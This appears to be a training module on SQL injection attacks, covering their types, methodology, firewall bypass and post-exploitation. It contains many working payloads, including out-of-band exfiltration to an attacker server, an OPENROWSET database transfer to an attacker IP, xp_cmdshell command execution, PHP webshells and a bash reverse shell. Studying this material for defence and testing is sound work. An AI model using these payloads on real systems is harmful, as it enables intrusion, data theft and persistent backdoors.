
---

# Comprehensive Guide to SQL Injection: Module 15

## Objective 01: Summarize SQL Injection Concepts

### SQL Injection Concepts
This section discusses the fundamental concepts of SQL injection attacks, their potential impact, and the foundational knowledge required to understand them. It begins with an introduction and basic examples before moving to more complex scenarios.

### What is SQL Injection?
SQL injection is a code injection technique used to attack data-driven applications. It exploits vulnerabilities in an application's software by inserting malicious SQL statements into an entry field for execution.

- **Core Mechanism:** Attackers take advantage of unsanitized input vulnerabilities to pass SQL commands through a web application to a backend database for execution.
- **Target:** It is fundamentally a flaw in the web application's code, not a database or web server issue. The attack manipulates the database directly using a series of malicious SQL queries.
- **Cause:** Applications use SQL statements for authentication, validation, and data storage/retrieval. SQL injection works because the application fails to properly validate input before passing it to an SQL statement.

### Why Bother About SQL Injection?
SQL injection is a critical issue for all database-driven websites. Based on how an application processes user-supplied data, SQL injection can be used to implement devastating attacks:

- **Authentication Bypass:** An attacker logs onto an application without valid credentials, often gaining administrative privileges.
- **Authorization Bypass:** An attacker alters authorization information stored in the database by exploiting the vulnerability.
- **Information Disclosure:** An attacker obtains sensitive confidential information stored in the database.
- **Compromised Data Integrity:** An attacker defaces a web page, inserts malicious content, or alters the contents of a database.
- **Compromised Availability of Data:** An attacker deletes database information, logs, or audit data to cover tracks or cause disruption.
- **Remote Code Execution:** In advanced scenarios, an attacker can compromise the underlying host operating system.

### SQL Injection and Server-side Technologies
Powerful server-side technologies like ASP.NET, PHP, JSP, Python, and Ruby on Rails, coupled with database servers (Microsoft SQL Server, Oracle, MySQL, IBM DB2), create dynamic, data-driven websites. These technologies implement business logic on the server side.

- **Vulnerability is not in the technology itself,** but in how developers use it. When developers ignore secure coding practices, they make applications and their relational databases vulnerable.
- The attack targets the application's method of accessing and manipulating stored data, exploiting a lack of input sanitization.

### Understanding HTTP POST Request
An HTTP POST request carries requested data to the web server as part of the message body, unlike a GET request which appends it to the URL. It is often perceived as more secure than GET because the data is not directly visible in the URL, and it can pass larger amounts of data.

- When a user submits a login form, the browser submits a string containing their credentials in the body of the POST request.
- A server-side script then uses these values to construct an SQL query, e.g., `select * from Users where (username = 'smith' and password = 'simpson');`

### Understanding Normal SQL Query and SQL Injection Query

#### Normal SQL Query
A user enters their username ("Peter") and password ("Pe***64***") into a login form. The application uses these inputs to construct an SQL query:
`SELECT Count(*) FROM Users WHERE UserName="Peter" AND Password="Pe***64***"`
The server-side code directly concatenates the textbox values into a query string:
`string strQry = "SELECT Count(*) FROM Users WHERE Username = '" + txtUser.Text + "' AND Password = '" + txtPassword.Text + "'";`

#### SQL Injection Query
An attacker inputs a malicious string, e.g., Username: `Blah' OR 1=1 --` and Password: `[anything]`. The inputs construct a malicious query:
`SELECT Count(*) FROM Users WHERE Username = 'Blah' OR 1=1 --' AND Password = '...'`

#### Code Analysis
In SQL, a pair of hyphens (`--`) denotes the beginning of a comment, causing the rest of the line to be ignored. The executed query becomes `SELECT Count(*) FROM Users WHERE Username = 'Blah' OR 1=1`. Since `1=1` is always true, the `WHERE` clause matches every row, bypassing the password check entirely.

### Understanding an SQL Injection Query
An SQL injection query exploits the normal execution pattern of SQL. An attacker submits values that execute normally but return unintended data from the database.

- This is possible due to the application's failure to filter malicious values before processing.
- **Example:** In an HTML form, for the username field, an attacker might submit `Blah'or 1=1 --`. The constructed query `SELECT Count(*) FROM Users WHERE Username = 'Blah' or 1=1 --...` always returns true, successfully executing with no syntax error.

### Understanding an SQL Injection Query—Code Analysis
Code analysis is the most effective technique for identifying vulnerabilities. An attacker exploits these flaws using the following process:
1.  A user enters credentials that match a database record.
2.  A dynamically generated SQL query retrieves the number of matching rows.
3.  The user is authenticated if a row is found.
4.  When the attacker enters `blah' or 1=1 --`, the `WHERE` clause condition is always true.
5.  The `--` comments out the password check, executing `SELECT Count(*) FROM Users WHERE UserName='blah' Or 1=1`.

### Example of a Web Application Vulnerable to SQL Injection: BadProductList.aspx
This page is a "hacker's paradise" as it allows hijacking to obtain confidential information, change data, or create new database accounts. Most SQL-compliant databases store metadata in system tables like `sysobjects` and `syscolumns`.

- A hacker can use these system tables to acquire database schema information.
- **Example:** Entering `UNION SELECT id, name, '0' FROM sysobjects WHERE xtype ='U'` into a `txtFilter` textbox may reveal the names of all user tables.
- The `UNION` statement is useful as it splices the results of one query into another. The trick is to match the number and data types of the original query's columns.
- A subsequent query like `UNION SELECT 0, UserName, Password, 0 FROM Users` could reveal all usernames and passwords. The code is vulnerable because the SQL query is dynamically constructed from user-supplied input.

### Example of a Web Application Vulnerable to SQL Injection: Attack Analysis
Most websites have a search feature. Attackers target this input field, as with any other, to perform SQL injection attacks by entering specific, malicious input values.

### Examples of SQL Injection
An SQL injection query exploits normal SQL execution. Attackers use various SQL commands to modify database values.

| Example | Attacker SQL Query |
| :--- | :--- |
| **Updating Table** | `blah'; UPDATE jb-customers SET jb-email = 'info@certifiedhacker.com' WHERE email = 'jason@springfield.com' --` |
| **Adding New Records** | `blah'; INSERT INTO jb-customers ('jb-email','jb-passwd','jb-login_id','jb-last_name') VALUES ('jason@springfield.com','hello','jason','springfield'); --` |
| **Identifying Table Name** | `blah' AND 1=(SELECT COUNT(*) FROM mytable); --` (Requires guessing table names) |
| **Deleting a Table** | `blah'; DROP TABLE Creditcard; --` |
| **Returning More Data** | `OR 1=1` (e.g., `SELECT * FROM User_Data WHERE Email_ID = 'blah' OR 1=1`) |

## Types of SQL Injection
Attackers use different techniques to view, manipulate, insert, and delete data. Here are the main types:

1.  **In-band SQL Injection:** The attacker uses the same communication channel to launch the attack and retrieve results. This is the most common and easy-to-exploit type.
2.  **Blind/Inferential SQL Injection:** The attacker gets no error messages or data directly. They send payloads and infer the database structure by observing the application's behavior (e.g., true/false responses or time delays). No actual data is transmitted via the web application.
3.  **Out-of-Band SQL Injection:** The attacker uses alternative channels (like DNS or HTTP requests from the database) to exfiltrate data. This is used when in-band techniques are not possible.

## In-Band SQL Injection
In-band SQL injection uses the same channel for attack and data retrieval. The most common forms are Error-based and UNION-based.

### Error-based SQL Injection
The attacker intentionally causes database errors by inserting bad inputs. By reading the resulting error messages, they gather information to find an SQL injection vulnerability and formulate further, more specific attacks.

### System Stored Procedure
The risk of executing malicious SQL in a stored procedure increases if the web application uses unsanitized user inputs to dynamically construct SQL statements. An attacker can enter malicious inputs that are then executed within the stored procedure.
- **Example:** A `Login` procedure that concatenates user input into a `@query` variable. An attacker can enter `anyusername or 1=1'` to bypass the password check.

### Illegal/Logically Incorrect Query
An attacker injects an illegal/logically incorrect request to generate an error message revealing information about injectable parameters, data types, or table names.
- **Example:** Entering `Bob"` for a username might generate an error like "Incorrect Syntax near 'Bob'. Unclosed quotation mark after the character string..." This reveals the structure of the underlying database query.

### UNION SQL Injection
The `UNION SELECT` statement combines the result of the original query with results from a malicious, injected query. An attacker can use this to extract data from other tables.

- **Example:** `SELECT Name, Phone, Address FROM Users WHERE Id=$id` can be exploited by setting `$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`. This appends credit card numbers to the returned user data.
- An attacker first tests for the vulnerability by adding a single quote (`'`) to a `.php?id=` command.

### Tautology
A tautology-based attack uses a conditional `OR` clause that is always true to bypass authentication.
- **Example:** `SELECT * FROM users WHERE name = '' OR '1'='1';` The second part of the `OR` clause is always true, so the query returns all users.

### End-of-Line Comment
An attacker uses line comments (`--`) to neutralize the rest of an SQL query after their injection point.
- **Example:** `SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'`. The database ignores everything after `--`, allowing login as `admin` without knowing the password.

### In-line Comments
Attackers integrate multiple vulnerable inputs into a single query using in-line comments (`/*...*/`). This can bypass blacklisting, remove spaces, or obfuscate queries.
- An attacker can gain administrator privileges by injecting `Attacker', 1, /*` as the username and `*/ 'mypwd` as the password, transforming a normal user creation query into one that creates an admin account.

### Piggybacked Query
In a piggybacked (or stacked queries) attack, an attacker injects an additional, completely separate query into the original one. This relies on the database supporting batched queries.

- Attackers use a semicolon (`;`) as a query delimiter.
- **Example:** `SELECT * FROM EMP WHERE EMP.EID = 1001 AND EMP.ENAME = 'Bob'; DROP TABLE DEPT;` The database executes the malicious query to drop the `DEPT` table after the first query runs.

### Error Based SQL Injection (Detailed)
This technique forces the database to return an error message in response to a crafted input. The attacker then analyzes this error to gather information.
- **Example (Oracle 10g):** A request to `http://www.example.com/product.php?id=10||UTL_HTTP.REQUEST('testerserver.com:80')||(SELECT user FROM DUAL)--`.
- The `UTL_HTTP.REQUEST` function tries to connect to `testerserver` and make an HTTP GET request containing the result of "SELECT user FROM DUAL". The attacker's web server captures this request, revealing the database username (e.g., `SCOTT`) out-of-band.

### UNION SQL Injection (Detailed)
This technique appends a forged query's results to the original query's results.

1.  **Determine Number of Columns:** Using `ORDER BY n--` and incrementing `n` until an error occurs.
2.  **Determine Data Types:** Using `UNION SELECT null, null, ...` or specific values to see which columns accept certain data types.
3.  **Execute the Attack:** Once the structure is known, the actual injection is performed. `SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

## Blind/Inferential SQL Injection
This is used when a web application is vulnerable, but the injection results are not visible to the attacker. Instead of data, a generic custom error page or a different page layout is displayed.

- **Mechanism:** It's identical to normal SQL injection, but the attacker asks a series of True/False questions to the database and infers the answer from subtle page changes or response times.
- **Time-intensive:** A new statement must be crafted for each bit of information recovered.

### Blind SQL Injection: No Error Message Returned
- If a system has generic error messages, an attack like `certifiedhacker'; drop table Orders --` might return a detailed error from the `Microsoft OLE DB Provider for ODBC Drivers`.
- If custom error messages are in place, the server might just return "Oops! We are unable to process your request." In this case, the attacker cannot rely on error details and must attempt blind SQL injection.

### Blind SQL Injection: Time-based SQL Injection
This technique evaluates time delays in responses to true/false queries. The `WAITFOR DELAY` statement is used to pause execution.
- **Example:** `IF EXISTS (SELECT * FROM creditcard) WAITFOR DELAY '0:0:10' --`
- If the `creditcard` table exists, the database will pause for 10 seconds before returning a generic error. This delay confirms the table's existence.
- **Commands:**
    - **Microsoft SQL Server:** `WAITFOR DELAY '0:0:10'`
    - **MySQL:** `BENCHMARK(howmanytimes, do_this)`

### Blind SQL Injection: Boolean Exploitation and Heavy Query

#### Boolean Exploitation
Multiple valid statements that evaluate to true or false are supplied in an HTTP request parameter. The attacker compares the response page between both conditions to infer success.
- **Example:** `http://www.myshop.com/item.aspx?id=67 and 1=2`. If `1=2` (false), no item details are shown. Changing it to `id=67 and 1=1` (true) will show the item, confirming an SQL injection vulnerability.

#### Heavy Query
Used to perform time-delay attacks without using time-delay functions (which might be disabled). A heavy query retrieves a massive amount of data, taking a long time to execute.
- Attackers generate heavy queries using multiple joins on system tables.
- **Example (Oracle):** `SELECT count(*) FROM all_users A, all_users B, all_users C`. Injecting this causes a noticeable delay, confirming the vulnerability.

## Out-of-Band SQL injection
This attack is used when the attacker cannot use the same channel to launch the attack and gather results. It relies on features of the database server to make an external connection (like DNS or HTTP) to an attacker-controlled server.

- **Microsoft SQL Server:** The `xp_dirtree` command can be exploited to send DNS requests.
- **Oracle Database:** The `UTL_HTTP` package can be used to send HTTP requests from SQL/PL/SQL.

---

## Objective 03: Explain SQL Injection Methodology

### Information Gathering and SQL Injection Vulnerability Detection
Attackers follow a structured methodology to ensure successful SQL injection attacks.

#### Information Gathering
This is the "survey and assess" phase. Attackers gather information about the target database, including its name, version, user, output mechanism, DB type, user privilege level, and OS interaction capability.
- **Understanding the SQL query** allows the attacker to craft correct injection statements.
- **Error messages are crucial.** The type of error dictates the attack technique.
- Attackers start by identifying the database engine, as different databases require different SQL syntax. They then try to identify user privilege levels.

**Steps for Information Gathering:**
1.  Check if the web application connects to a database server.
2.  List all input fields, hidden fields, and post requests that could be used for crafting an SQL query.
3.  Attempt to inject code into input fields to generate an error.
4.  Try inserting a string value where a number is expected.
5.  Use the `UNION` operator to combine result sets.
6.  Check the detailed error messages for more information.

### Identifying Data Entry Paths
An attacker searches for all possible input gates (input fields, hidden fields, cookies) through which SQL injection can be attempted. They analyze web GET and POST requests using automated tools.

- **Tools for Identification:**
    - **Tamper Dev:** A Chrome extension to intercept and edit HTTP/HTTPS requests and responses.
    - **Burp Suite:** A comprehensive web application security testing utility that intercepts traffic, modifies requests, and identifies vulnerabilities like SQL injection.

### Extracting Information through Error Messages
Based on the type of information in an error message, an attacker chooses an SQL injection technique. Information can be gained through:

- **Parameter Tampering:** Manipulating GET/POST parameters to generate errors. Error messages may reveal the DB server name, directory structure, and function names.
- **Determining Database Engine Type:** Generating ODBC errors is the easiest way. The error message will often state the driver and DB engine type. If not, an educated guess can be made based on the OS and web server.
- **Determining a SELECT Query Structure:** Attackers force application errors to reveal table names, column names, and data types. They first try error-free navigation with `' and '1' = '1` or `' and '1' = '2`, then use clauses like `' group by columnnames having 1=1 --`.
- **Grouping Error:** The `HAVING` command, used with `GROUP BY`, can generate an error telling which columns have not been grouped, revealing column names.
- **Type Mismatch:** Inserting strings into numeric fields (e.g., using a `UNION SELECT` with a string where an integer is expected) will cause an error showing the data that could not be converted.
- **Blind Injection Error Signatures:** Even without detailed data, error signatures or time delays (`; if condition waitfor delay '0:0:5' --`) can be used to extract information.
- If applications return a generic '500 Server Error' or a custom page without details, then blind injection techniques are necessary.

### SQL Injection Vulnerability Detection: Testing for SQL Injection
After gathering information, the attacker lists all input points and tries to inject code to generate errors. They use standard "testing strings" (a cheat sheet) to check for vulnerabilities. Examples include:
- `'or 1=1--`
- `'or 1 in (select @@version)--`
- `'group by userid having 1=1--`
- `'union all select @@version--`
- `Admin' OR '`

### Additional Methods to Detect SQL Injection
- **Function Testing:** A black-box testing technique where a set of inputs is evaluated against expected results. It checks functionality without knowing internal code. Examples include testing with `http://.../...?parameter=1`, `...?parameter=1'`, `...?parameter=1 AND 1=1--`, etc.
- **Fuzz Testing (Fuzzing):** An adaptive black-box testing technique where massive amounts of random data ("fuzz") are inputted to observe changes in output and discover coding errors. **Tools:** BeSTORM, Burp Suite, AppScan, Defensics, SnapFuzz.
- **Static Testing:** Analysis of the web application source code.
- **Dynamic Testing:** Analysis of the runtime behavior of the web application.

### SQL Injection Black Box Pen Testing
In black box testing, the tester has no prior knowledge. They identify the system's infrastructure and use special characters, white spaces, and SQL keywords to find vulnerabilities.

- **Detecting SQL Injection Issues:** Send single and double quotes as input data to catch unsanitized inputs.
- **Detecting Input Sanitization:** Use a right square bracket (`]`) as input to see if it's used as part of an SQL identifier without sanitization.
- **Detecting Truncation Issues:** Send long strings of junk data (like buffer overrun detections) to see if they throw SQL errors.
- **Detecting SQL Modification:** Send long strings of single quotes to max out the return values of `REPLACE` and `QUOTENAME` functions, which might truncate the command variable.

### Source Code Review to Detect SQL Injection Vulnerabilities
This is a white-box testing method to systematically examine source code for vulnerabilities during the implementation phase of the Security Development Lifecycle (SDL).

- **Static Code Analysis:** Analysis of code *without* execution (using Taint, Lexical, or Data Flow Analysis). Tools: Veracode, SonarQube, PVS-Studio, Coverity, Parasoft Jtest, CAST AIP, Klockwork.
- **Dynamic Code Analysis:** Analysis of code *at runtime* to find security flaws from its interaction with SQL databases and web services.
- **Testing for Blind SQL Injection in MySQL/MSSQL:** An attacker tests a URL like `shop.com/items.php?id=101 and 1=0` (should return FALSE) and then `shop.com/items.php?id=101 and 1=1` (should return TRUE). If the correct page is returned for the second request, the URL is vulnerable to blind SQL injection.

### Launch SQL Injection Attacks
After information gathering and vulnerability detection, the attacker uses the identified vulnerability to perform specific attack types.

#### Perform Error Based SQL Injection
The attacker uses database-level error messages to extract data.

- **Extract Database Name:** `http://www...?id=1 or 1=convert(int,(DB_NAME))--`
- **Extract 1st Database Table:** `...?id=1 or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--`
- **Extract 1st Table Column Name:** `...?id=1 or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--`
- **Extract 1st Field of 1st Row:** `...?id=1 or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--`

#### Perform Error Based SQL Injection using Stored Procedure Injection
If developers use dynamic SQL within a stored procedure without sanitizing user input, the procedure is vulnerable.
- **Example 1:** A `user_login` procedure that concatenates input. A user enters `anyusername or 1=1' anypassword` to bypass authentication.
- **Example 2:** A `get_report` procedure that accepts a column list. A malicious user enters `1 from users; update users set password = 'password'; select *` which updates all user passwords.

#### Perform Union SQL Injection
The attacker uses the `UNION SELECT` clause to extract data.
- **Extract Database Name:** `...?id=1 UNION SELECT ALL 1,DB_NAME,3,4--`
- **Extract Database Tables:** `...?id=1 UNION SELECT ALL 1, TABLE_NAME,3,4 from sysobjects where xtype=char(85)--`
- **Extract Table Column Names:** `...?id=1 UNION SELECT ALL 1,column_name,3,4 from DB_NAME.information_schema.columns where table_name ='EMPLOYEE_TABLE'--`
- **Extract 1st Field Data:** `...?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from EMPLOYEE_NAME--`

#### Bypass Website Logins Using SQL Injection
This is a fundamental and easy exploit. An attacker inserts a malicious string into a login form to bypass authentication.
- Common inputs in login forms:
    - `admin' --`
    - `admin' #`
    - `' or 1=1--`
    - `' or 1=1#`
    - `') or '1'='1--`
- **Login as a different user:** `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`
- **Bypass login avoiding MD5 hash check:** Provide a username and password, then union the results with a known password and its calculated MD5 hash (e.g., `' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'`).

#### Blind SQL Injection - Extract Database User
An attacker can extract a database username by asking yes/no questions using time delays.
1.  **Check for username length:** `...?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--` (Increment the length until a 10-second delay occurs).
2.  **Find each character of the user:** `...?id=1; IF (ASCII(lower(substring((USER),1,1)))==97) WAITFOR DELAY '00:00:10'--` (Cycle through all ASCII letters for each character position until the delay occurs).

#### Blind SQL Injection - Extract Database Name
Similar to extracting a username, the attacker uses a time-based blind SQL injection.
1.  **Check for DB Name length:** `...?id=1; IF (LEN(DB_NAME())=4) WAITFOR DELAY '00:00:10'--`
2.  **Find each character of the name:** `...?id=1; IF (ASCII(lower(substring((DB_NAME()),1,1)))==97) WAITFOR DELAY '00:00:10'--`

#### Blind SQL Injection - Extract Column Name
The same brute-force methodology is applied to extract column names.
- **Extract 1st Table Column Name:** `...?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP'),1,1)))>101) WAITFOR DELAY '00:00:10'--`

#### Blind SQL Injection - Extract Data from ROWS
Data from rows is extracted using the same time-based method.
- **Extract 1st Field of 1st Row:** `...?id=1; IF (ASCII(substring((SELECT TOP 1 EID from EMP),1,1))=106) WAITFOR DELAY '00:00:10'--`

#### Exporting a Value with Regular Expression Attack
An attacker uses regular expressions on a known table to learn values like passwords, which are typically hashed and contain only `[a-f0-9]`.
- **MySQL Example:** `index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-f]' AND ID=2)` (Iteratively narrows down the character set, e.g., first checking `[a-f]`, then `[d-f]`, then `d`).
- **MSSQL Example:** Uses the `LIKE` operator. `default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[a-f]%' AND ID=2)` (Iteratively narrows down like before to extract the first, second, and subsequent characters).

#### Perform Double Blind SQL Injection
A sophisticated attack where no direct feedback is received from the web application. The attacker relies on indirect signs like time delays caused by heavy queries or `benchmark()`/`sleep()` functions.
- **Example:** `/?id=1+AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,1,benchmark(2000000,md5(now())))`. A time delay confirms the guessed character value without an error message.

#### Perform Blind SQL Injection Using Out-of-Band Exploitation Technique
This technique uses DBMS functions to perform an out-of-band connection to the attacker's server, providing the results of the injected query as part of that request.
- **Example (Oracle):** `http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80')||(SELECT user FROM DUAL)--`
- The attacker's web server (e.g., using Netcat on port 80) receives an HTTP GET request like `GET /SCOTT HTTP/1.1`, revealing the database username.

#### Exploiting Second-Order SQL Injection
This occurs when data input is stored in a database without validation and later used in another SQL query without using parameterized queries. The initial malicious input doesn't cause direct harm but is triggered by a subsequent action.
- **Sequence:** 1. Attacker submits a crafted input in an HTTP request. 2. The application saves it to the database for later use. 3. The attacker makes a second request. 4. The application processes the second request using the stored, malicious first input, executing the injection.
- **Impact:** An attacker can read, update, and delete arbitrary data or execute commands on the underlying OS.

### Bypass Firewall to Perform SQL Injection
Attackers use various methods to bypass Web Application Firewalls (WAFs).

- **Normalization Method:** If a WAF is improperly configured, an attacker can obfuscate a query like `/?id=1/*union*/union/*select*/select+1,2,3/*` which normalizes to a valid injection.
- **HPP (HTTP Parameter Pollution):** Override or add HTTP GET/POST parameters by injecting delimiting characters. e.g., `/?id=1;select+1&id=2,3+from+users+where+id=1--`
- **HPF (HTTP Parameter Fragmentation):** Used with the UNION operator to bypass filters. Splits a malicious query across multiple parameters (e.g., `?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--`).
- **Blind SQL Injection Technique:** Replaces WAF signatures with their synonyms using SQL functions (e.g., `/?id=1+OR+0x50=0x50` instead of `OR 1=1`).
- **Signature Bypass:** Transform the signature of SQL queries to evade detection. e.g., `/?id=1+union+(select+'xz'from+xxx)` or `/?id=(1)union(select(1),mid(hash,1,32)from(users))`.
- **Buffer Overflow Method:** Exploit WAFs developed in C/C++ by sending extremely large payloads that can crash the WAF, allowing the malicious packet through. e.g., `?page_id=null%0A/**//*50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLECT*/%0A/*nnaa*/+1,2,3,4...`
- **CRLF Technique:** Use carriage return and line feed characters (`%0A%0D`) to split the SQL statement in a way that is ignored by the WAF but executed by the database. e.g., `...?id=1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5--`
- **Integration Method:** A combined use of various bypassing techniques to increase the chance of success.
- **Bypassing WAF using JSON-based SQL Injection Attack:** Manipulating JSON input in POST requests. WAFs may not detect SQL injection operators within JSON structures. e.g., injecting `{"user":"admin'--","pass":"irrelevant"}` to bypass login.

### Perform SQL Injection to Insert a New User and Update Password
- **Inserting a New User:** If an attacker learns the structure of the Users table, they can use a piggybacked `INSERT` query to add a new user. `SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com'; INSERT INTO Users (...) VALUES (...)`
- **Updating Password:** An attacker can exploit a "Forgot Password" feature. They inject an `UPDATE` statement to change the target user's email address to their own. When they click "Forgot Password," the reset link is sent to the attacker's email.
    - **Query:** `...'; UPDATE Users SET Email_ID = 'attacker@email.com' WHERE Email_ID = 'victim@email.com'`

### Advanced SQL Injection: Database, Table, and Column Enumeration
Attackers use various SQL queries to enumerate database structures to further compromise data.

- **Identify User Level Privilege:** Use built-in scalar functions like `user`, `current_user`, `session_user`, `system_user`. e.g., `' and 1 in (select user) --`.
- **Discover DB Structure:**
    - Determine table/column names: `' group by columnnames having 1=1 --`
    - Discover column name types: `' union select sum(columnname) from tablename --`
    - Enumerate user-defined tables: `' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --`
- **DB Administrators:** Accounts like `sa`, `system`, `sys`, `dba`, `admin`, `root` are targets.
- **Column Enumeration in DBMS:**
    - **MSSQL:** `SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')` or `sp_columns tablename`
    - **MySQL:** `show columns from tablename`
    - **Oracle:** `SELECT * FROM all_tab_columns WHERE table_name='tablename'`
    - **DB2:** `SELECT * FROM syscat.columns WHERE tabname='tablename'`
    - **PostgreSQL:** `SELECT attnum,attname from pg_class, pg_attribute WHERE relname='tablename' AND pg_class.oid=attrelid AND attnum > 0`

### Advanced Enumeration
Attackers use advanced enumeration for system and network-level information gathering and to crack passwords. They use different database objects:

| Oracle | MS Access | MySQL | MSSQL Server |
| :--- | :--- | :--- | :--- |
| `SYS.USER_OBJECTS` | `MSysAccessObjects` | `mysql.user` | `sys.objects` |
| `SYS.USER_TABLES` | `MSysACEs` | `mysql.db` | `sys.columns` |
| `SYS.USER_VIEWS` | `MSysObjects` | `mysql.tables_priv` | `sys.types` |
| `SYS.ALL_TABLES` | `MSysQueries` | | `sys.databases` |
| `SYS.USER_TAB_COLUMNS` | `MSysRelationships` | | |

- **Example query to enumerate tables, columns, and types in one query:** `... UNION select 0, sys.objects.name + ' .' + sys.columns.name + ' .' + sys.types.name, ...`
- **Database Enumeration:** `' and 1 in (select min(name) from master.dbo.sys.databases where name > '.') --`
- **File Location of Databases:** `' and 1 in (select min(filename) from master.dbo.sys.databases where filename > '.') --`

### Features of Different DBMS
Knowing the database type allows attackers to confine their attack area and use correct syntax.

| Feature | MySQL | MSSQL | MS Access | Oracle | DB2 | PostgreSQL |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **String Concat** | `concat(,)` | `'+'` | `'&'` | `'||'` | `concat` | `'||'` |
| **Comments** | `--, #` | `--` | None | `--` | `--` | `--` |
| **Request Union** | `union` | `union` | `union` | `union` | `union` | `union` |
| **Sub-requests** | Yes | Yes | No | Yes | Yes | Yes |
| **Stored Procedures** | Yes | Yes | Yes | Yes | Yes | Yes |

- **Examples:**
    - **MySQL:** `SELECT * from table where id = 1 union select 1,2,3`
    - **PostgreSQL:** `SELECT * from table where id = 1; select 1,2,3`
    - **Oracle:** `SELECT * from table where id = 1 union select null,null,null from sys.dual`

### Creating Database Accounts
Attackers can add new user accounts at the DBMS level.

- **MS SQL Server:** `exec sp_addlogin 'victor', 'Pass123'; exec sp_addsrvrolemember 'victor', 'sysadmin'`
- **Oracle:** `CREATE USER victor IDENTIFIED BY Pass123... ; GRANT CONNECT TO victor; GRANT RESOURCE TO victor;`
- **MS Access:** `CREATE USER victor IDENTIFIED BY 'Pass123'`
- **MySQL:** `INSERT INTO mysql.user (user, host, password) VALUES ('victor', 'localhost', PASSWORD('Pass123'))`

### Password Grabbing
One of the most serious consequences of an SQL injection attack. Attackers form queries to grab passwords directly from user-defined tables. They may use a dynamic SQL loop to concatenate all usernames and passwords and then display them through an error message or a time-based channel.

### Grabbing SQL Server Hashes
Passwords are often stored as hashes in the `sys.syslogins` table. Attackers extract these hashes and then brute-force them offline.
- **Step 1:** Extract: `SELECT password FROM sys.syslogins`
- **Step 2:** Hex each hash using a loop and a string `0123456789ABCDEF`.
- **Step 3:** Display the long hexed hashes through error messages by chunking them with the `substring` function from a temporary table.
- **Sample Hash:** `0x010034767D5C0CFA5FDCA...`

### Transfer Database to Attacker's Machine
An attacker can link a target SQL Server's database back to their own machine using `OPENROWSET`. The DB structure is replicated, and data is transferred. The attacker connects to a remote machine on port 80.
- **Example:** `insert into OPENROWSET('SQLOLEDb','uid=sa;pwd=Pass123;Network=DBMSSOCN; Address=myIP,80;', 'select * from mydatabase.hacked_sysdatabases') select * from sys.sysdatabases --`

### Interacting with the Operating System
There are two main ways to interact with the host OS:
1.  **Reading and writing system files:** Read arbitrary files or steal credentials from the target system.
2.  **Direct command execution:** Using Microsoft SQL Server's `xp_cmdshell`.
    - **Example:** `; exec master..xp_cmdshell 'ipconfig > test.txt' --` The attacker can then read `test.txt` back through the database.

### Interacting with the File System
MySQL allows reading and writing files through the database.
- **`LOAD_FILE()`:** Reads the contents of a file on the MySQL server.
    - `NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*` displays the contents of the passwd file.
- **`INTO OUTFILE()`:** Dumps the results of a query into a file on the server.
    - `NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'` creates a PHP webshell.
    - The attacker can then execute commands: `http://www.certifiedhacker.com/shell.php?command=wget`

### Network Reconnaissance Using SQL Injection
- **Assessing Network Connectivity:**
    - Retrieve server name: `' and 1 in (select @servername)` or `' and 1 in (select srvname from sys.sysservers)`
    - Use utilities like `ping`, `nslookup`, `arp`, `netstat` through `xp_cmdshell`.
- **Full Query Example:** A massive script can be injected to run `arp -a`, `ipconfig /all`, `nbtstat -c`, `netstat -ano`, `route print`, and `tracer -w 10 -h 10 google.com`, outputting them all to a text file which is then read back.
    - *Note: `xp_cmdshell` may be disabled by default and can be enabled with `EXEC sp_configure 'xp_cmdshell', 1 GO RECONFIGURE GO` if the attacker has high privileges.*

### Finding and Bypassing Admin Panel of a Website
- **Finding the Panel:** Attackers use Google dorks to locate the admin panel.
    - `inurl:"adminlogin.aspx"`
    - `inurl:"admin/index.php"`
    - `inurl:"administrator.php"`
    - `inurl:"/login.php"`
- **Bypassing Authentication:** Once the panel is found, they use classic SQL injection strings to bypass the login.
    - `Username: 1'or'1'='1`
    - `Password: 1'or'1'='1`
    - Other common strings: `' or 1=1 --`, `admin'--`, `" or 0=0 --`, `or 0=0 #`.
- After bypassing authentication, the attacker has full admin panel access and can install backdoors.

### PL/SQL Exploitation
PL/SQL is vulnerable to SQL injection when dynamic queries integrate user input at run time.
- **Exploiting Quotes:** An attacker injects `'x' OR '1'='1'` into the password field of a stored procedure, altering the logic to always return true.
- **Exploitation by Truncation:** Using in-line comments (`--`) to truncate the remainder of the query. e.g., `EXEC Validate_UserPassword ('Bob'--', '');` The password check is commented out.
- **Countermeasures:** Minimize user inputs to dynamic SQL, use `DBMS_ASSERT` package, use bind parameters, and employ the principle of least privilege.

### Creating Server Backdoors using SQL Injection
- **Getting OS Shell:** Using `xp_cmdshell` to execute arbitrary commands and create a reverse shell. e.g., `EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'`
- **Using Outfile:** Creating a PHP shell on the web server. `SELECT '<?php exec($_GET['cmd']); ?>' FROM usertable INTO dumpfile '/var/www/html/shell.php'`
